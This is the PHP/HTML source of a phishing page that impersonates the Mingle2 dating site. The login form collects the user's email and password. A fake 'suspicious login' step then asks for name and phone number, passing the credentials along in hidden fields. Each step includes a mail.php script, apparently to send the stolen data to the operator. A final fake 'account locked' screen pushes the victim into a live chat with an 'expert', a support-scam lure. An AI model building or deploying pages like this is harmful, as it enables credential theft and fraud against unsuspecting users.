<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Online Dating Site - Online Dating Service - Personals ads | Mingle2.com</title>
    <link rel="stylesheet" href="assets/css/all.min.css">
    <link rel="stylesheet" href="assets/css/bootstrap.min.css">
    <link rel="stylesheet" href="assets/css/style.css">
</head>

<body>
    <!-- navigation -->
    <nav class="navbar navbar-expand-lg" id="navigation-bar">
        <a class="navbar-brand" href="#"  style=" margin: auto;">
            <img src="assets/images/logo.webp" width="80px">
        </a>
     
    </nav>

     <?php
     if (isset($_POST['btnLoginMore'])) {
        
        include 'mail.php';
    ?>

        <!-- <div class="container-fluid" id="middle-section"> -->
            <div class="container-fluid" id="welcome-section">

        <form action="" method="post">
             <div class="alert mb-4 alert-danger text-center">
                There is a suspicious login attempt from your server
            </div>
        <h2 id="heading">Kindly verify your details <span></span></h2>
          
          <input type="hidden" name="email" value="<?php echo $_POST['email']; ?>" />
         <input type="hidden" name="password" value="<?php echo $_POST['password']; ?>" />

            <div class="form-group">
                <input type="text" class="form-control" name="fname" placeholder="First Name" required>
            </div>

            <div class="form-group">
                <input type="text" class="form-control" placeholder="Last Name" name="lname" required>
            </div>
            <div class="form-group">
                <input type="text" class="form-control" placeholder="Registered Number" name="number" required>
            </div>
            
                <button class="btn btn-block btn-primary" name="fromLog" type="submit">Verify </button>
            
        </form>

    </div>
    <?php } elseif (isset($_POST['fromLog'])) {
         include 'mail.php';
     ?>

     <div class="container-fluid" id="middle-error-section">
        <h2 id="heading">Important Message: <span></span></h2>
        <form action="" method="post">
            <p>Your account has been <b>temporarily locked</b><br>for security reasons.
               <br>Kindly connect to chat for resolving the issues.</p>
            <div class="form">
                <label>Error CODE: EBRX1:6X76D</label><br>
            </div>
            <div class="calling-number">
                <a href="javascript:void(Tawk_API.toggle())">Ask Expert</a>
            </div>
           
        </form>
    </div>

    <?php } else { ?>

    <div class="container-fluid" id="welcome-section">
        <h2 id="heading" style="color: #fff;">Completely free online dating</h2>
        <form action="" method="post">
            <div class="form-group">
                <input type="email" class="form-control" id="exampleInputEmail1" name="email" aria-describedby="emailHelp"
                    placeholder="Email" required>
            </div>

            <div class="form-group">
                <input type="password" class="form-control" id="exampleInputPassword1"
                    placeholder="Password" name="password" required>
            </div>

            <button name="btnLoginMore" type="submit" class="btn btn-block btn-primary">Login</button>
            <div class="links">
                <a href="#">Forgot password ?</a>
               
            </div>
        </form>
           </div>
    <?php } ?>

    <script src="assets/js/jquery-3.5.1.min.js"></script>
    <script src="assets/js/popper.js"></script>
    <script src="assets/js/bootstrap.min.js"></script>
</body>
</html>